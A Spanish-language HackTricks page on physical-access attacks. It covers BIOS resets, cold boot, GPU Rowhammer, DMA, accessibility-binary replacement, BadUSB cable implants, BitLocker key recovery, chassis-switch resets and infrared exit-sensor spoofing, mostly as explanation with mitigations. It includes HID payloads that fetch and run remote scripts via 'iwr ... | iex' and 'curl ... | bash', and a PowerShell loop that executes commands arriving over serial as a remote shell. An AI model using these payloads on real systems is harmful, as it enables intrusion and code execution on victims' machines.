# Ataques físicos

{{#include ../banners/hacktricks-training.md}}

Para descubrir interfaces a nivel de placa, acceder a consolas serie y a la memoria flash, y realizar ataques de side channel y glitching, consulta [Hardware Hacking](hardware-hacking/README.md) y sus capítulos sobre interfaces específicas. Esta página cubre ataques que requieren acceso físico al sistema en su conjunto.

## Recuperación de contraseñas del BIOS y seguridad del sistema

La configuración del firmware de PC heredado puede restablecerse desconectando la batería CMOS o usando un jumper documentado para borrar la CMOS. El tiempo necesario con el equipo apagado depende de la placa, y las contraseñas o claves de UEFI modernas pueden estar almacenadas en memoria flash no volátil, en un controlador integrado o en un dispositivo de seguridad; por tanto, pueden persistir tras retirar la batería. Consulta el manual de la placa o de servicio antes de poner pines en cortocircuito; este procedimiento también puede invalidar las mediciones del TPM y activar la recuperación del cifrado del disco.

En sistemas x86 heredados, herramientas como **killCMOS** y **CmosPwd** pueden inspeccionar o modificar la configuración almacenada en la CMOS desde un entorno arrancable. CmosPwd reconoce formatos de contraseña de un conjunto documentado de familias de BIOS antiguas y puede respaldar, restaurar o borrar/eliminar el estado de la CMOS; sus versiones publicadas están destinadas a entornos heredados de DOS/Windows, Linux, FreeBSD y NetBSD.<sup>[[18]](#references)</sup> Estas utilidades no son herramientas genéricas para eliminar contraseñas de UEFI y requieren acceso suficiente al hardware o al firmware.

Algunos firmwares de portátiles muestran un código de desafío específico del fabricante tras varios intentos fallidos de contraseña. Bases de datos como [bios-pw.org](https://bios-pw.org) pueden generar contraseñas de recuperación heredadas de algunos fabricantes para ciertos modelos, pero muchos sistemas implementan un bloqueo sin un desafío del que se pueda derivar una contraseña. Considera cualquier contraseña generada como específica del modelo y evita agotar los contadores de intentos permanentes.

### Seguridad de UEFI

Para sistemas **UEFI** modernos, CHIPSEC puede auditar las protecciones de las variables de Secure Boot. Empieza con la comprobación que no modifica nada indicada abajo; el modo opcional `-a modify` intenta deliberadamente corromper variables y solo debe usarse en un sistema de laboratorio que se pueda recuperar. CHIPSEC advierte que su controlador con privilegios y el acceso de bajo nivel al hardware no son adecuados para endpoints de producción.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## Análisis de RAM y ataques Cold Boot

La DRAM no pierde todos sus bits inmediatamente cuando se detiene la actualización. La tasa de degradación varía considerablemente según la tecnología del módulo y la temperatura; el enfriamiento puede preservar datos útiles mucho más tiempo que un ciclo de apagado y encendido sin enfriar. Un ataque cold-boot reinicia rápidamente el sistema en un entorno de adquisición pequeño o transfiere un módulo enfriado, captura la memoria sin procesar y reconstruye claves criptográficas a pesar de la degradación de bits. Una utilidad para copiar discos no es automáticamente una herramienta de captura de memoria física, y Volatility analiza una captura en lugar de adquirirla; utiliza una herramienta de adquisición validada y adecuada para la plataforma.<sup>[[12]](#references)</sup>

---

## GPU Rowhammer contra las tablas de páginas

Los ataques modernos de GPU Rowhammer son mucho más útiles cuando apuntan a los **metadatos de memoria virtual de la GPU** en lugar de a búferes normales. Investigaciones recientes sobre **GPU NVIDIA Ampere con GDDR6** muestran que un atacante que ejecute código CUDA sin privilegios puede crear patrones de hammering específicos de la GPU, usar **memory massaging** para ubicar estructuras de paginación en filas vulnerables y, luego, invertir bits en la **tabla de páginas de último nivel** o en un **directorio de páginas** intermedio. Una vez que se corrompe una sola entrada de traducción, el atacante puede establecer **lectura/escritura arbitraria de memoria de la GPU** y pivotar hacia el compromiso del host.<sup>[[1]](#references)[[2]](#references)</sup>

### Patrón de explotación

1. **Identificar filas susceptibles al hammering** en GDDR6 y crear patrones de hammering sensibles a la actualización / no uniformes que eviten las mitigaciones en DRAM.
2. **Manipular las asignaciones de GPU** para que el controlador ubique las estructuras de traducción de páginas en ubicaciones físicas susceptibles al hammering, en lugar de mantenerlas en el pool protegido predeterminado. En la práctica, esto puede implicar agotar la región de memoria baja de las tablas de páginas y llenar la memoria con asignaciones UVM dispersas grandes con pasos controlados.
3. **Invertir bits en los metadatos de traducción**, como bits **PFN** o relacionados con el aperture, dentro de una entrada de tabla de páginas / directorio de páginas, de modo que la página virtual controlada por el atacante se resuelva como páginas de tablas de páginas, memoria arbitraria de la GPU o asignaciones del sistema visibles para el host.
4. Reutilizar la asignación falsificada para reescribir entradas de traducción adicionales y escalar a **lectura/escritura arbitraria de memoria de la GPU** entre contextos de GPU.

### Pivot al host y mitigaciones

- Con **IOMMU deshabilitado**, las asignaciones falsificadas del aperture del sistema pueden exponer **memoria física arbitraria del host** a la GPU, convirtiendo la primitiva de GPU en un compromiso total del host.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** apunta a entradas de tablas de páginas de último nivel, mientras que **GeForge** demuestra que corromper un nivel del directorio de páginas puede ser más fácil, ya que invertir un solo bit puede redirigir un subárbol de traducción mayor. No consideres crítica para la seguridad una sola capa de paginación.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** sigue siendo importante porque bloquea la ruta directa a memoria arbitraria del host que usan GDDRHammer/GeForge, pero **no es una mitigación completa**. **GPUBreach** demuestra un pivot de segunda etapa en el que el atacante corrompe búferes de CPU, propiedad del controlador y escribibles por la GPU, y luego activa errores de seguridad de memoria del controlador NVIDIA para obtener una primitiva de escritura en el kernel y una **shell root**, incluso con IOMMU habilitado.<sup>[[3]](#references)</sup>
- **ECC a nivel de sistema** es una medida práctica de hardening en GPU de estaciones de trabajo/servidores compatibles. Las GPU de consumo sin ECC ofrecen una superficie de defensa más débil.<sup>[[4]](#references)</sup>
- Estos ataques no son puramente teóricos: **GeForge** informó **1,171** inversiones de bits en una RTX 3060 y **202** en una RTX A6000, cantidad suficiente para crear una cadena funcional de escalada de privilegios en el host.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Ataques de acceso directo a memoria (DMA)

Para la modificación offline de UEFI IFR/NVRAM que puede reducir la aplicación de IOMMU antes del arranque y habilitar una cadena de DMA en Windows, consulta:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** demuestra la adquisición y modificación de memoria mediante **DMA** a través de interfaces como FireWire y las primeras configuraciones de Thunderbolt, incluidas firmas históricas de bypass de inicio de sesión. No es simplemente «ineficaz contra Windows 10»: la posibilidad de explotación depende de la interfaz, la compilación de destino, la política de IOMMU, el estado de bloqueo y si Windows Kernel DMA Protection es compatible y está habilitado. Windows 10, versión 1803 y posteriores, introdujo Kernel DMA Protection en plataformas compatibles, lo que modificó considerablemente la superficie de ataque.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB para acceder al sistema

En un volumen de Windows sin cifrar o ya desbloqueado, un entorno offline puede reemplazar binarios de accesibilidad como **sethc.exe** o **Utilman.exe** por **cmd.exe**, lo que proporciona un símbolo del sistema de SYSTEM cuando se usa el atajo correspondiente en la pantalla de inicio de sesión. Herramientas como **chntpw** pueden editar los datos de cuentas locales de SAM. Estos métodos no evitan el bloqueo de un volumen BitLocker y pueden dañar credenciales protegidas con DPAPI/EFS; conserva copias forenses y copias de seguridad.

**Kon-Boot** es una herramienta comercial de bypass de autenticación durante el arranque para configuraciones compatibles de Windows/macOS. La compatibilidad depende del sistema operativo, el modo de firmware, Secure Boot y la configuración de cifrado del disco; no descifra un volumen BitLocker bloqueado.<sup>[[10]](#references)</sup>

---

## Gestión de las funciones de seguridad de Windows

### Atajos de arranque y recuperación

- **Delete/Supr**, F2, F10 u otra tecla del fabricante pueden abrir la configuración del firmware.
- **F8** abre las opciones avanzadas de arranque de Windows heredadas solo en configuraciones donde esa ruta siga habilitada; el acceso a la recuperación actual varía.
- Mantener presionada **Shift** puede suprimir el inicio de sesión automático de Windows en algunas configuraciones, aunque la política o la configuración del registro pueden deshabilitar ese comportamiento.<sup>[[17]](#references)</sup>

### Dispositivos BAD USB

Dispositivos como **USB Rubber Ducky** y placas Teensy pueden enumerarse como teclados HID de confianza e inyectar pulsaciones de teclas predefinidas. La carga útil inicialmente tiene los privilegios y el acceso al escritorio de la sesión iniciada; los avisos de UAC, el bloqueo de pantalla, la distribución del teclado, los tiempos y la política USB del endpoint siguen limitándola.<sup>[[15]](#references)</sup>

Los periféricos programables también pueden atacar analizadores del kernel del host y coordinar varios dispositivos USB para manipular el heap y divulgar información:

{{#ref}}
../binary-exploitation/linux-kernel-exploitation/usb-audio-descriptor-oob-kaslr-leak.md
{{#endref}}

Para un caso del analizador de almacenamiento masivo UAS de Windows, consulta:

{{#ref}}
../binary-exploitation/windows-kernel-exploitation/uasp-report-luns-cache-size-oob-write.md
{{#endref}}

### Volume Shadow Copy

Los privilegios de administrador o de copia de seguridad permiten crear una copia sombra o guardar los hives del registro para adquirir archivos bloqueados como **SAM** y **SYSTEM**. Esta es una técnica de recopilación posterior al compromiso, no un bypass de privilegios, y debe correlacionarse con eventos de `diskshadow`/VSS y de exportación de hives del registro.

## Técnicas de implantes BadUSB / HID

### Gadget HID de Android activado mediante NFC

Un teléfono Android con root puede convertirse en un teclado USB programable solo cuando su controlador USB y su kernel ofrecen **compatibilidad con USB gadget/HID**. En dispositivos compatibles, Kali NetHunter expone perfiles de gadget a través de **USB Arsenal**. Otra opción es [USB Gadget Tool](https://github.com/tejado/android-usb-gadget), que crea funciones de gadget ConfigFS y puede exponer dispositivos de caracteres de teclado/ratón como `/dev/hidg0` y `/dev/hidg1`. La herramienta solo crea el endpoint del gadget; otro proceso debe escribir informes HID en él. El acceso root no compensa la falta de ConfigFS, de compatibilidad con HID gadget o de un USB Device Controller utilizable en el kernel.<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

Este endpoint puede combinarse con NFC de Android como activador físico. La aplicación [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID) lee el UID de una etiqueta, lo convierte a la representación esperada, lo compara con una lista blanca local y, si coincide, envía una secuencia de teclado configurada al estilo Rubber Ducky. El host conectado recibe una entrada de teclado normal y no necesita software NFC.<sup>[[22]](#references)[[24]](#references)</sup>

Valida la enumeración y la distribución del teclado en un editor de texto vacío antes de usar atajos o comandos. Una carga útil inofensiva es:<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

Límites de confianza importantes:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- Una **lista blanca de UID es identificación, no autenticación**. Los UID son públicos y algunos tipos de tokens o emuladores permiten clonarlos o suplantarlos. Un UID permitido copiado sigue la misma ruta de procesamiento que el token original.
- El módulo Magisk **NfcScreenOff** modifica el servicio NFC para que se comporte como si la pantalla estuviera encendida y desbloqueada. Si el teléfono ya está conectado a un host, esto puede permitir que alguien active el payload sin desbloquearlo.
- Las contraseñas, los tokens de API y los comandos almacenados en el payload son secretos recuperables en un dispositivo rooteado o con el bootloader desbloqueado. Escribir una contraseña mediante HID es automatización de contraseñas reutilizables, no autenticación sin contraseña.
- La inyección HID actúa con los privilegios del escritorio activo y depende del foco, los tiempos y la distribución del teclado del host. Exige una confirmación reciente del usuario antes de ejecutar acciones sensibles, evita incluir secretos privilegiados en scripts y usa un autenticador de desafío-respuesta criptográfico para la autenticación real.

### Implantes de cable gestionados por Wi-Fi

- Los implantes basados en ESP32-S3, como **Evil Crow Cable Wind**, se ocultan dentro de cables USB-A→USB-C o USB-C↔USB-C, se enumeran únicamente como un teclado USB y exponen su stack C2 mediante Wi-Fi. El operador solo necesita alimentar el cable desde el host de la víctima, crear un hotspot llamado `Evil Crow Cable Wind` con la contraseña `123456789` y abrir [http://cable-wind.local/](http://cable-wind.local/) (o su dirección DHCP) para acceder a la interfaz HTTP integrada.<sup>[[8]](#references)</sup>
- La interfaz del navegador ofrece pestañas para *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* y *Config*. Los payloads almacenados se etiquetan por SO, las distribuciones del teclado se cambian sobre la marcha y las cadenas VID/PID se pueden modificar para imitar periféricos conocidos.
- Como el C2 está dentro del cable, un teléfono puede preparar payloads, activar su ejecución y administrar las credenciales Wi-Fi sin usar la red de la organización, algo útil para intrusiones físicas de corta duración.

### Payloads AutoExec con reconocimiento del SO

- Las reglas de AutoExec vinculan uno o más payloads para que se ejecuten inmediatamente después de la enumeración USB. El implante realiza una identificación ligera del SO y selecciona el script correspondiente.
- Flujo de trabajo de ejemplo:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) o `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Como la ejecución no requiere supervisión, basta con cambiar un cable de carga para lograr acceso inicial “plug-and-pwn” en el contexto del usuario que inició sesión.

### Shell remoto iniciado mediante HID a través de Wi-Fi TCP

1. **Inicio mediante pulsaciones de teclas:** Un payload almacenado abre una consola y pega un bucle que ejecuta lo que llegue por el nuevo dispositivo serie USB. Una variante mínima para Windows es:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Puente de cable:** El implante mantiene abierto el canal USB CDC mientras su ESP32-S3 inicia una conexión como cliente TCP (mediante un script de Python, un APK de Android o un ejecutable de escritorio) hacia el operador. Cualquier byte introducido en la sesión TCP se reenvía al bucle serie anterior, lo que permite la ejecución remota de comandos incluso en hosts aislados. La salida es limitada, por lo que los operadores suelen ejecutar comandos a ciegas (crear cuentas, preparar herramientas adicionales, etc.).

### Superficie de actualización HTTP OTA

- La interfaz documentada de Evil Crow Cable Wind expone un endpoint de actualización de firmware sin autenticación en `/update`:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Los operadores de campo pueden intercambiar funciones en caliente (p. ej., cargar firmware de USB Army Knife) durante una operación sin abrir el cable, lo que permite que el implante cambie a nuevas capacidades mientras sigue conectado al host objetivo.

## Elusión del cifrado BitLocker

Una adquisición forense autorizada de un sistema activo o que se haya estado ejecutando recientemente puede contener una clave maestra de volumen de BitLocker o material de clave relacionado mientras el volumen está desbloqueado. Herramientas comerciales como Elcomsoft Forensic Disk Decryptor y Passware Kit Forensic pueden buscar en imágenes de memoria, archivos de hibernación o volcados de fallos compatibles, pero no se garantiza que tengan éxito. Las versiones modernas de Windows también cifran los volcados de fallos cuando BitLocker está habilitado, y una contraseña de recuperación de 48 dígitos almacenada es un artefacto distinto de una clave de volumen presente en memoria.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Ingeniería social para añadir una clave de recuperación

Un atacante que convenza a un administrador para ejecutar comandos de administración de BitLocker puede añadir un protector de contraseña de recuperación, clave externa u otro tipo y luego capturarlo. Una contraseña de recuperación no puede ser una cadena arbitraria de ceros: las contraseñas de recuperación numéricas de BitLocker tienen un formato validado de 48 dígitos. La sintaxis pertinente para la administración autorizada es `manage-bde -protectors -add C: -recoverypassword`; enumera los protectores resultantes con `manage-bde -protectors -get C:`. Supervisa la adición de protectores y asegúrate de que el nuevo material de recuperación solo se guarde en ubicaciones aprobadas.<sup>[[16]](#references)</sup>

---

## Explotación de los interruptores de intrusión del chasis / mantenimiento para restablecer la BIOS a los valores de fábrica

Muchos portátiles modernos y equipos de escritorio compactos incluyen un **interruptor de intrusión del chasis** supervisado por el Embedded Controller (EC) y el firmware de BIOS/UEFI. Aunque el propósito principal del interruptor es generar una alerta cuando se abre un dispositivo, algunos fabricantes implementan un **atajo de recuperación no documentado** que se activa al conmutar el interruptor con un patrón específico.<sup>[[5]](#references)[[6]](#references)</sup>

### Cómo funciona el ataque

1. El interruptor está conectado a una **interrupción GPIO** del EC.
2. El firmware que se ejecuta en el EC lleva un registro del **momento y el número de pulsaciones**.
3. Cuando se reconoce un patrón codificado, el EC invoca una rutina de *mainboard-reset* que **borra el contenido de la NVRAM/CMOS del sistema**.
4. En el siguiente arranque, los modelos afectados cargan el estado de firmware restablecido. Según el fabricante y la revisión, el estado borrado puede incluir una contraseña de supervisor, ajustes de arranque personalizados o claves de Secure Boot inscritas; el estado del TPM y los efectos sobre el cifrado del disco deben evaluarse por separado.

> Un restablecimiento del firmware puede restaurar las opciones de arranque externo, pero **no** descifra el almacenamiento. BitLocker u otro sistema de cifrado de disco completo puede entrar en modo de recuperación tras cambios en el TPM o el firmware y seguir protegiendo la unidad interna si no se dispone de una clave de recuperación.<sup>[[16]](#references)</sup>

### Ejemplo real: portátil Framework 13

El atajo de recuperación del Framework 13 (11.ª/12.ª/13.ª generación) es:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Tras el décimo ciclo, el EC establece una marca que indica al BIOS que borre la NVRAM en el siguiente reinicio. Todo el procedimiento tarda ~40 s y no requiere **nada más que un destornillador**.<sup>[[5]](#references)</sup>

### Procedimiento genérico de explotación

1. Enciende o suspende y reanuda el objetivo para que el EC esté en funcionamiento.
2. Retira la cubierta inferior para dejar expuesto el interruptor de intrusión/mantenimiento.
3. Reproduce el patrón de alternancia específico del fabricante (consulta la documentación y los foros, o aplica ingeniería inversa al firmware del EC).
4. Vuelve a montar el equipo y reinícialo; después, comprueba qué ajustes del firmware y credenciales cambiaron realmente.
5. Si tienes autorización y el arranque externo está disponible, inicia una imagen live controlada. Una vez que se desbloquee legítimamente un volumen interno (o si nunca estuvo cifrado), el entorno live puede obtener credenciales y datos, o inspeccionar la EFI System Partition. Modificar esa partición para instalar un implante EFI es persistente y muy intrusivo, y sigue estando limitado por Secure Boot, el arranque medido, la protección contra escritura del firmware y la monitorización de endpoints. El almacenamiento cifrado sigue siendo inaccesible sin su clave o material de recuperación.

### Detección y mitigación

* Registra los eventos de intrusión en el chasis en la consola de administración del SO y correlaciónalos con reinicios inesperados del BIOS.
* Usa **sellos de seguridad a prueba de manipulación** en tornillos y cubiertas para detectar aperturas.
* Mantén los dispositivos en **áreas con control físico**; asume que el acceso físico equivale a un compromiso total.
* Cuando esté disponible, desactiva la función del fabricante «restablecimiento mediante interruptor de mantenimiento» o exige una autorización criptográfica adicional para restablecer la NVRAM.

---

## Inyección IR encubierta contra sensores de salida sin contacto

### Características del sensor
- Los sensores comerciales de «salida con movimiento de la mano» combinan un emisor LED de infrarrojo cercano con un módulo receptor similar al de un control remoto de TV, que solo devuelve un nivel lógico alto después de detectar varios pulsos (~4–10) de la portadora correcta (≈30 kHz).<sup>[[7]](#references)</sup>
- Una cubierta de plástico impide que el emisor y el receptor se vean directamente entre sí, por lo que el controlador asume que toda portadora validada procede de un reflejo cercano y activa un relé que abre el pestillo de la puerta.
- Una vez que el controlador detecta un objetivo, suele cambiar la envolvente de modulación de salida, pero el receptor sigue aceptando cualquier ráfaga que coincida con la portadora filtrada.

### Flujo de ataque
1. **Captura el perfil de emisión**: conecta un analizador lógico a los pines del controlador para registrar las formas de onda previas y posteriores a la detección que activan el LED IR interno.
2. **Reproduce solo la forma de onda «posterior a la detección»**: retira o ignora el emisor original y activa un LED IR externo con el patrón que ya activa el sensor desde el principio. Como al receptor solo le importa el número de pulsos y la frecuencia, interpreta la portadora falsificada como un reflejo real y activa la línea del relé.
3. **Controla la transmisión por intervalos**: transmite la portadora en ráfagas calibradas (por ejemplo, decenas de milisegundos encendida y un intervalo similar apagada) para enviar el número mínimo de pulsos sin saturar el AGC del receptor ni la lógica de gestión de interferencias. La emisión continua desensibiliza rápidamente el sensor e impide que se active el relé.

### Inyección reflectante de largo alcance
- Sustituir el LED de laboratorio por un diodo IR de alta potencia, un controlador MOSFET y óptica de enfoque permite una activación fiable desde ~6 m.
- El atacante no necesita tener línea de visión directa hacia la apertura del receptor: apuntar el haz a paredes interiores, estanterías o marcos de puertas visibles a través del cristal permite que la energía reflejada entre en el campo de visión de ~30° y simule un movimiento de la mano a corta distancia.
- Como los receptores solo esperan reflejos débiles, un haz externo mucho más intenso puede rebotar en varias superficies y aun así superar el umbral de detección.

### Linterna de ataque armada
- Integrar el controlador en una linterna comercial oculta la herramienta a plena vista. Sustituye el LED visible por un LED IR de alta potencia adaptado a la banda del receptor, añade un ATtiny412 (o similar) para generar las ráfagas de ≈30 kHz y usa un MOSFET para derivar la corriente del LED.
- Una lente telescópica de zoom concentra el haz para aumentar el alcance y la precisión, mientras que un motor de vibración controlado por el MCU proporciona confirmación háptica de que la modulación está activa, sin emitir luz visible.
- Alternar entre varios patrones de modulación almacenados (con frecuencias de portadora y envolventes ligeramente distintas) aumenta la compatibilidad con familias de sensores reetiquetados y permite al operador barrer superficies reflectantes hasta oír el clic del relé y que se abra la puerta.

---

## References

- [1] [GDDRHammer: alteración drástica de filas DRAM — ataques Rowhammer entre componentes desde GPU modernas](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: usar Rowhammer en memoria GDDR para falsificar tablas de páginas de GPU por diversión y beneficio](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: ataques de escalada de privilegios en GPU mediante Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Aviso de seguridad: Rowhammer - julio de 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – «Framework 13. Pulsa aquí para comprometerlo»](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Guía para restablecer la placa base](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – «¡No toques! Cómo eludir sensores IR de salida sin contacto con una linterna IR encubierta»](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – «Conectar, usar, comprometer: hacking con Evil Crow Cable Wind»](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Ataque Rowhammer contra chips NVIDIA](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Documentación oficial de Kon-Boot e información de compatibilidad](https://kon-boot.com/)
- [11] [Documentación de CHIPSEC - Protecciones de variables de Secure Boot](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Para que no olvidemos: ataques de arranque en frío contra claves de cifrado](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - manipulación de memoria física mediante DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Protección DMA del kernel](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Documentación de Hak5 USB Rubber Ducky](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - Guía de operaciones de BitLocker](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - Mantener pulsada la tecla Mayús y el inicio de sesión automático](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - Documentación y descargas de CmosPwd](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Documentación de Kali Linux - NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Documentación del kernel de Linux - controlador de gadget USB HID](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [USB Gadget Tool](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [Convierte un teléfono Android con root en un autenticador NFC y una herramienta de automatización para tu PC](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)
{{#include ../banners/hacktricks-training.md}}
